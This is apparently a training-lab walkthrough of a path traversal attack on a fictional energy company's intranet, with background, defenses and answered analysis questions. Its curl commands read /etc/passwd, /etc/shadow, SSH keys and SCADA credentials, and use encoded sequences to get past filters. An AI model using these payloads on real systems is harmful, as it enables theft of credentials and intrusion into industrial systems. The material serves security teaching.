    Background: Path Traversal Attacks

    Path traversal (also called directory traversal or dot-dot-slash attacks) occurs when an application uses user-supplied input to construct file paths without proper validation. The attacker manipulates the path by inserting ../ sequences to navigate up the directory tree and access files outside the intended directory.

    How Path Traversal Works

    Consider a web application that serves documents from /data/documents/. A normal download request looks like:

    GET /download?file=safety/fire-evacuation-plan.txt

    The server constructs the full path by prepending the document root:

    /data/documents/ + safety/fire-evacuation-plan.txt = /data/documents/safety/fire-evacuation-plan.txt

    An attacker modifies the file parameter to include directory traversal sequences:

    GET /download?file=../../../etc/passwd

    The server constructs:

    /data/documents/ + ../../../etc/passwd = /etc/passwd

    Each ../ moves one directory up. Three ../ sequences from /data/documents/ reach the filesystem root, and /etc/passwd resolves to the system password file.

    URL Encoding of Traversal Sequences

    Web Application Firewalls (WAFs) and input filters sometimes block literal ../ strings. Attackers bypass these filters using URL-encoded equivalents:

    Encoding Decoded Value Use Case
    %2e%2e%2f ../ Standard URL encoding
    %2e%2e/ ../ Partial encoding
    ..%2f ../ Partial encoding
    %252e%252e%252f ../ (double-encoded) Bypasses single-decode filters
    ..%c0%af ../ (overlong UTF-8) Bypasses Unicode-unaware filters
    ....// Resolves to ../ Bypasses filters that strip single ../

    Defense Strategies

    Proper defenses against path traversal include:

    1. Allowlisting: Maintain a list of permitted files and reject any request for a file not on the list
    2. Canonicalization: Resolve the full path using os.path.realpath() or equivalent, then verify it starts with the expected document root
    3. Chroot jails: Restrict the web application process to a specific directory subtree so traversal beyond the root is impossible at the OS level
    4. Input rejection: Strip or reject any input containing ., /, \, or null bytes, though allowlisting is more reliable

    Walkthrough

    Step 1: Launch the Exercise

    Navigate to the platform and launch the File Server Traversal exercise (MEG3.1). Note the target IP addresses displayed in the Active Lab View. Three containers will start: the intranet portal, the file server, and the corporate database.

    Step 2: Configure Host Resolution

    Add the target hostnames to your /etc/hosts file so you can reference them by name. Replace <subnet> with your lab subnet.

    Kali - Add target hostnames to /etc/hosts

    echo "<subnet>.10  intranet.meridian-energy.corp" | sudo tee -a /etc/hosts
echo "<subnet>.11  files.meridian-energy.corp" | sudo tee -a /etc/hosts
echo "<subnet>.12  db.meridian-energy.corp" | sudo tee -a /etc/hosts

    Verify the entries resolve correctly:

    Kali - Verify hostname resolution

    ping -c 1 intranet.meridian-energy.corp

    You should see ICMP replies from the expected IP address. If the ping times out, verify your VPN connection and check that the IP addresses match your lab assignment.

    Step 3: Explore the Intranet Portal

    Open the corporate intranet in your browser or use curl to examine the landing page:

    Kali - Fetch the intranet landing page

    curl -s http://intranet.meridian-energy.corp/

    The response should show a login page. The intranet requires authentication before granting access to any internal resources. Look for the login form fields and the form action URL in the HTML source.

    Step 4: Authenticate to the Intranet

    Use Lisa Thornton's Systems Administrator credentials to log in. The login endpoint accepts POST requests with email and password parameters.

    Kali - Authenticate as Lisa Thornton

    curl -s -c cookies.txt -X POST http://intranet.meridian-energy.corp/login \
  -d "email=l.thornton@meridian-energy.corp&password=Lisa2024#"

    The -c cookies.txt flag saves the session cookie to a file. Examine the response for a redirect or welcome message. A successful login should redirect you to the dashboard or return a session token.

    Check what the dashboard shows:

    Kali - Access the intranet dashboard with session cookie

    curl -s -b cookies.txt http://intranet.meridian-energy.corp/dashboard

    Look for navigation links, department listings, and any references to a document library or file download feature. The dashboard should present several sections, including a link to the company document repository.

    Step 5: Browse the Document Library

    Navigate to the document library section. The intranet organizes documents by category.

    Kali - Access the document library

    curl -s -b cookies.txt http://intranet.meridian-energy.corp/documents

    The response should list document categories such as Safety, Operations, HR, and Engineering. Each document has a download link. Examine the HTML source carefully to identify the URL pattern used for downloads.

    Look for anchor tags or JavaScript calls that reference a download endpoint. The pattern should resemble:

    /download?file=safety/fire-evacuation-plan.txt
/download?file=operations/shift-schedule-template.xlsx
/download?file=hr/employee-handbook-2024.pdf

    The file parameter specifies a relative path within the document root. The server prepends /data/documents/ to construct the full filesystem path.

    Step 6: Download a Legitimate Document

    Confirm the download feature works with a valid document path:

    Kali - Download a legitimate document

    curl -s -b cookies.txt "http://intranet.meridian-energy.corp/download?file=safety/fire-evacuation-plan.txt"

    The response should contain the text of the fire evacuation plan. Note the content type and format. The server reads the file from disk and returns its contents directly in the HTTP response body, with no additional encoding or transformation.

    Step 7: Test for Path Traversal

    Now test whether the download endpoint validates the file path. Start with a basic traversal attempt to read /etc/passwd:

    Kali - Test path traversal with /etc/passwd

    curl -s -b cookies.txt "http://intranet.meridian-energy.corp/download?file=../../../etc/passwd"

    If the response contains lines in the format username:x:uid:gid:comment:home:shell, path traversal is confirmed. The application is constructing the path as:

    /data/documents/ + ../../../etc/passwd = /etc/passwd

    The three ../ sequences traverse up from /data/documents/ through /data/ and / to the filesystem root, then descend into /etc/passwd.

    Examine the passwd file output. Look for:

    • System accounts: root, www-data, postgres, and other service accounts reveal what software is installed
    • User accounts: Any human user accounts may have home directories with additional files to target
    • Shell assignments: Accounts with /bin/bash or /bin/sh can be logged into; accounts with /usr/sbin/nologin cannot

    Step 8: Determine the Directory Structure

    Before targeting the secrets directory, confirm the document root path and explore the server's file structure:

    Kali - Read the current process environment to find paths

    curl -s -b cookies.txt "http://intranet.meridian-energy.corp/download?file=../../../proc/self/cmdline" | tr '\0' ' '

    The /proc/self/cmdline file reveals the command that started the web application process, which often includes the working directory or configuration file path. The tr '\0' ' ' converts null-byte separators to spaces for readability.

    Try reading the application's own configuration or source files to understand the directory layout:

    Kali - Explore the /data directory listing

    curl -s -b cookies.txt "http://intranet.meridian-energy.corp/download?file=../../etc/hostname"

    Adjusting the number of ../ sequences helps you understand exactly how deep the document root sits in the filesystem. Two ../ from /data/documents/ reaches /, and then you descend into /etc/hostname.

    Step 9: Traverse to the Secrets Directory

    The document root is /data/documents/. The secrets directory sits at /data/secrets/, which is a sibling directory. To reach it, you only need to traverse up one level from the document root and then into secrets/:

    Kali - List the contents of the secrets directory

    curl -s -b cookies.txt "http://intranet.meridian-energy.corp/download?file=../secrets/"

    If the server returns a directory listing or error message, you may need to guess filenames. Based on the engagement context (SCADA credentials), try common names:

    Kali - Attempt to read SCADA credentials file

    curl -s -b cookies.txt "http://intranet.meridian-energy.corp/download?file=../secrets/scada-credentials.txt"

    The response should contain SCADA system credentials, including usernames, passwords, and connection strings for industrial control systems. Among the credentials, look for a flag value in OCR{...} format.

    Step 10: Try URL-Encoded Traversal

    If the direct ../ attempt is blocked by a filter, try URL-encoded variants:

    Kali - Test URL-encoded path traversal

    curl -s -b cookies.txt "http://intranet.meridian-energy.corp/download?file=%2e%2e/secrets/scada-credentials.txt"

    And double-encoded:

    Kali - Test double-encoded path traversal

    curl -s -b cookies.txt "http://intranet.meridian-energy.corp/download?file=%252e%252e/secrets/scada-credentials.txt"

    Compare the responses. Some filters decode the input once and check for ../, so double encoding (%252e decodes to %2e on first pass, then to . on second pass) can bypass single-decode filters.

    Step 11: Extract Additional Sensitive Files

    With path traversal confirmed, explore what else is accessible. In a real engagement, you would extract as much data as possible to support further attack phases.

    Kali - Read the web application configuration

    curl -s -b cookies.txt "http://intranet.meridian-energy.corp/download?file=../../../etc/shadow"

    The /etc/shadow file contains password hashes. If the web application runs as root (a serious misconfiguration), you will see the hashes. If it runs as a non-root user, you will get a permission denied error, which tells you something about the application's privilege level.

    Kali - Check for SSH keys

    curl -s -b cookies.txt "http://intranet.meridian-energy.corp/download?file=../../../root/.ssh/authorized_keys"

    Authorized keys files reveal which SSH public keys grant access to the system. Private keys (if readable) provide direct authentication without passwords.

    Analysis Questions

    1. The file server stores documents in /data/documents/ and secrets in /data/secrets/. An attacker only needs ../secrets/ to reach the credentials. What directory structure would make this traversal more difficult?

    Reveal Answer

    Storing sensitive files on a completely separate filesystem or volume would prevent traversal from reaching them. If /data/documents/ is a mounted volume and /data/secrets/ lives on an entirely different mount point (e.g., /opt/secure/secrets/), traversal from the document root cannot reach the secrets regardless of how many ../ sequences are used within the mount. Additionally, running the web application in a chroot jail or container with only the document directory mounted eliminates filesystem traversal entirely. The sibling directory layout (/data/documents/ next to /data/secrets/) is the worst-case scenario because a single ../ reaches the sensitive files.

    2. The application returns the raw file contents in the HTTP response. How would the response differ if the application used a file-streaming approach with proper Content-Disposition headers, and would that prevent the attack?

    Reveal Answer

    Adding Content-Disposition: attachment; filename="document.txt" headers would force the browser to download the file rather than display it inline, but would not prevent the attack. The traversal vulnerability exists in the path construction logic, not in how the response is delivered. An attacker using curl or a script ignores Content-Disposition headers entirely. The response would still contain the file contents. Proper defense requires validating the resolved path against an allowlist or verifying it stays within the document root after canonicalization.

    3. During the engagement, you used /proc/self/cmdline to learn about the running process. What other files in /proc/self/ would be valuable to an attacker exploiting path traversal?

    Reveal Answer

    Several /proc/self/ files provide valuable intelligence: /proc/self/environ exposes all environment variables (often containing database credentials, API keys, and secret tokens), /proc/self/cwd is a symlink to the current working directory, /proc/self/exe is a symlink to the running binary, /proc/self/fd/ contains file descriptors that may point to open log files or database connections, and /proc/self/maps shows memory mappings that reveal loaded libraries and ASLR base addresses. The environment variables file is the highest-value target because applications frequently store secrets in environment variables following the twelve-factor app methodology.

    Key Takeaways

    • Path traversal exploits insufficient input validation on file path parameters to access files outside the intended directory
    • A single ../ can reach sibling directories; three ../ sequences from a typical document root reach the filesystem root
    • URL encoding (%2e%2e%2f) and double encoding (%252e%252e%252f) bypass naive string-matching filters
    • The /proc/self/ virtual filesystem exposes process metadata that accelerates exploitation
    • Storing sensitive files as siblings to web-accessible directories is a critical architectural mistake
    • Canonicalization (resolving the real path) combined with prefix checking is the most reliable server-side defense
    • The SCADA credentials extracted through this vulnerability enable the next phase of the engagement
